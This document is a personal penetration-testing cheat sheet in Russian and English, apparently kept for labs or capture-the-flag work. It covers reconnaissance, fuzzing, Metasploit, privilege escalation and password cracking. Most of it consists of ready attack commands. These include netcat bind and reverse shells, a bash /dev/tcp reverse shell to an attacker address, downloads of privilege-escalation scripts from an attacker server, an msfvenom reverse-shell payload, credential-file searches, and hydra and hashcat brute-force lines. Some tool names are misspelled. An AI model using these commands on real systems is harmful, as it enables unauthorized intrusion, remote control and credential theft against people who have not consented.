export key="value"
        setup variable for all subprocess (iverwise set key="value" only for current user)
!!      повторить последнюю команду
wc      подсчет байт/символов/слов/строк в файле
sed     редактирование на лету (stream editing: sed 's/from/to/')
cat file | grep pattern | cut -d ' ' -f 4 | tr -d '%' | sort | uniq
cut -d ":" -f 2 <file>
        divider ":", field 2, from every line in file
awk -F "::" '{print $1 $5}'
        продвинутый cut, подволяет задавать в качестве разделителя более 1 символа
sort    сортировка вывода 
uniq -c подсчет количества повторяющихся строк, т.к. сравнивает только с соседними
w       список зашедших в систему пользователей

target validation: whois, nslookup, dnsrecon

arp -a
arp-scan -l
route print
netstat -ano

netdisover -r ip/net
	поиск хостов в сети

nmap -sS ip
	SYS SYNACK ACK scan of well known ports
nmap -T4 -p- -A ip
	T[1-5], 5 - agressive, 1 - slow, -T3 - тоже самое, что без ключа T вообще
	-p- all 65535 ports
	-A - all: -sC (run scripts) -sV (versions detection) -O (OS detection) --traceroute
curl -v -s <ip> 1>/dev/null
	-v verbose - выдает метаданные ответа (заголовок страницы - это strerr - pipe 2)
	без -v выдает тело ответа - strout (pipe 1), -s silence - без вывода % заугрузки
	1>/dev/null убирает из вывода тело ответа, оставляя только метаданные заголовка
	
nikto -h ip
	searching vulns for outdated components
dnsrecon -r 127.0.0.0/24 -n 192.168.43.226 -d dd
	перечисление записей целевого домена, этот запрос узнает, какие записи есть на DNS сервере 192.168.43.226
	, принадлежащих диапазону ip адресов 127.0.0.1-127.0.0.255
find / -type f -perm 4000 2>/dev/null
	поиск фалов с SUID (2000 для SGID и 1000 для Sticky bit)

===============SHELL
BIND shell:	nc <victim ip> 4444	-->	nc -lvp 4444 -e /bin/sh
REVERSE shell:	nc -lvp 4444		<--	nc <attacker ip> 4444 -e /bin/sh
nc -nv <ip> <port>
	соединиться по порту к удаленному ip
python -m http.server 80
	2е соединение с атакуемой машиной из 1го шелла для превышения прав доступа к удаленному узлу:
-	wget http://<ip of python server listener>/linpeas.sh
	curl -O http://<ip:port>/linpeas.sh
		скачать скрипт превышения прав или скрипт поиска полезной информации (linpeas.sh)
-	certuil.exe -urlcache -f http://<ip>:<port>/winpeas.exe
		использование certutil в windows в качестве клиента для скачки winpeas.exe
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
	однострочный шел код (больше на pentest monkey)
picture upload - possible reverse shell (php file uploading)
python -c 'import pty; pty.spawn("/bin/bash")'
	запуск удобной командной оболочки, предватительно проверить, есть ли питон, иначе - другая командя для tty shell
	echo $0 - в каком шеле мы находимся (в каком скрипте)
Первым делом на удаленной машине:
id
pwd
history
sudo -l	какие команды доступны из-под sudo для данного пользователя
sudo -u <username> id
gtfobin
	повышение прав доступа (privilege excalation), web портал с командами повышения до root
	если sudo -l дало какой-то результат или в системе есть SUID

sc start/query/stop <service name>
	для перезапуска атакуемого сервиса на Windows, имя сервиса - из вывода winPEAS.exe

=================RECON
linPEAS
	privelege escalation script from github
	его можно использовать для поиска полезной информации, когда уже есть подключение к целевой системе
winPEAS	тоже самое для Windows
pspy64	скрипт с github для вывода полного списка процессов, в т.ч. от root
	дает посмотреть список задач cron и др. всех пользователей

showmount -e <ip>
	показать инф об NFS системе на удаленном сервере
mount -t ntf <ip>:/<remote path> <local path>
mount -t nfs 192.168.43.281:/srv/nfs /mnt/dev
	примонтировать nfs систему локально в local path из пути remote path, найденном утилитой showmaount

================RECON WINDOWS
systeminfo
wmic qfe	обновления
wmic qfe get <column>
whoami /priv	текущие привелегии
whoami /groups	к каким группам принадлежит пользователь
net user	список пользователей
net localgroup [arministrators]
findstr /si "password=" *.txt *.ini *.config
dir *.kdbx /s	поиск файлов в подпапках из текущей
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
		тоже самое в powershell
sc		service control
sc query windefend
netsh firewall show state

================FUZZING
gobuster - на Go, только консоль (более современная версия dirb и dirbuster)
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
gobuster vhost -u http://target.com -w subdomains.txt
ffuf - более современный
	перечисление разных web путей, показываются доступные web страницы
ffuf -u http://ip/FUZZ -w <path to txt files with words> -s -t 10
	использование фаззера ffuf: по слову FUZZ задается, что будет парситься, 
	подставляя вместо него слова из txt файла            
	словари для паролей/имен лежат в metasploit, словари для web дежат в dirbuster
        -recursion - по этому флагу рекурсивно фаззится поиск папок и файлов
	-s - silence, -t 10 - запустить в 10 потоков
ffuf -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
	фаззинг запроса search.req, сохраненного их burp (в файле надо поставить FUZZ на позицию перебора)
generic_send_tcp <ip> <port> file.spk 0 0
	начать фаззинг протокола по формату файла        
foobuzz
	фаззер сетевых протоколов, наследник SPIKE (generic_send_tcp)

============METASPLOIT
msfconsole
	Metasploit framework
	search <string> - поиск эксплоитов по ключевому слову (название уязвимой функции, название протокола)
	use <N> - загрузка эксплоита по номеру из списка вывода search (search trans2open)
	options - посмотреть опци загруженного эксплоита
	set param value - установить значение value для параметра param из списка options
	run (or exploit)

searchsploit samba2.2.1a
	поиск уязвимостей и эксплоитов по версии

/usr/share/metaslpoit-framework/tools/exploit/pattern_create.rb -l 3000
	создать нагрузку длиной 3000 байт для отправки в уязвимое приложение 
	для удобного нахождения смещения сообщения до перезатирания адреса возврата
/usr/share/metaslpoit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386f4337
	найти смещение нахождения байт 386а4337 в созданной нагрузке длиной 3000 байт

msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
	генерирование шел кода с IP <attacker ip>, в формате си, плохие символы - 0x0,
	предварительно надо запустить nc -lnvp 4444 на атакующей машине

mona.py на github - плагин для Immunity debugger для проверки, какие модули не имеют защиты ASLR, SEH и др.
                      
==========SAMBA                                   
smbclient -L \\\\ip\\
	попытка подключения к samba серверу, smbclient \\\\ip\\ IPC$
crontab -l
	поиск задач в cron от текущего пользователя
crontab -u root -l
systemctl list-timers
	перечисление всех запускаемых по времени служб на сервере


==========BROUTEFORCE
hydra -l username -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
	перебор паролей для пользователя username, порт 2222
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
	перебор имен для известного пароля
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"
	перебор паролей для user по запросу из burp
hydra -l admin -P passes.txt 192.168.1.1 http-get /admin
	HTTP Basic Auth (в браузере выскакивает окошко логина): GET /admin HTTP/1.1 \nAuthorization: Basic YWRtaW46cGFzcw==
hydra -L users.txt -P passes.txt 192.168.1.1 http-get-form "/path:param1=^USER^&param2=^PASS^:Error_string"
	GET параметры в URL (логин через URL типа ?user=admin&pass=123): GET /login?user=admin&pass=123
curl -X POST http://192.168.192.201/index.php -d "fm_usr=user&fm_pwd=test"
	проверить вручную
hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt -r demo.rule --force
	взлом хеша типа -m 0 (MD5) по словарю и правилам из файла demo.rule, без вывода предупреждений (--force), используется CPU
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
	взлом файла программы keepass
hashid или hash-identifier	проверить тип хеша
keepass2john	преобразовать *.kdbx файл в читаемый johntheripper, не забыть удалить заголовок "Database:"
medusa
	broutforce attack
hash-identifier
	определить тип хеша

fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip
	взломщик архива по перебору

============PATHS
/usr/share/wordlists/dirb/others/names.txt
	имена/логины
/usr/share/wordlists/rockyou.txt
	пароли










